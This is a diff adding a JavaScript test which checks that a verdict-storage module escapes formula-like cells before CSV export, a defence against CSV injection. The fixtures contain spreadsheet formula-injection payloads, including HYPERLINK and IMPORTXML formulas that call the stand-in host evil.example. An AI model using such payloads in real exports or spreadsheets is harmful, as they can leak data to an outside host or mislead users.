@@ -80,4 +80,22 @@ describe("verdict-storage", () => {
     expect(rows[0]?.decided_at).toEqual(expect.any(Number));
     await expect(exportVerdictsAsCsv()).resolves.toContain("policy::warn");
   });
+
+  it("prefixes formula-like csv cells before export", async () => {
+    await appendVerdict(
+      insert({
+        dapp_origin: "=HYPERLINK(\"https://evil.example\",\"open\")",
+        policy: { id: null, name: "+SUM(1,1)", severity: "warn" },
+        reason: { ko: "  =IMPORTXML(\"https://evil.example\")", en: "@cmd" },
+      }),
+    );
+
+    const csv = await exportVerdictsAsCsv();
+    expect(csv).toContain(
+      "\"'=HYPERLINK(\"\"https://evil.example\"\",\"\"open\"\")\"",
+    );
+    expect(csv).toContain("\"'+SUM(1,1)\"");
+    expect(csv).toContain('"\'  =IMPORTXML(""https://evil.example"")"');
+    expect(csv).toContain("'@cmd");
+  });
 });
